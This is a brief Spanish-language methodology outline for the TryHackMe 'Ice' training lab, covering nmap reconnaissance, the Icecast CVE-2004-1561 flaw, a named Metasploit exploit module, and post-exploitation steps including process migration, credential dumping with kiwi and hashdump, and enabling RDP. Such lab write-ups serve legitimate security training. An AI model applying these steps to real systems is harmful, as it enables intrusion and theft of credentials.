# Metodología – TryHackMe: Ice

1. **Reconocimiento**
   - `nmap` para detectar servicio Icecast en puerto 8000.

2. **Enumeración**
   - Identificación del servicio vulnerable Icecast CVE‑2004‑1561.

3. **Explotación**
   - Metasploit: módulo `exploit/windows/http/icecast_header`.

4. **Post‑explotación**
   - `migrate -N spoolsv.exe`
   - `load kiwi`
   - `creds_all`
   - `hashdump`
   - `run post/windows/manage/enable_rdp`

5. **Informe**
   - Documentación técnica del compromiso completo del sistema Windows.
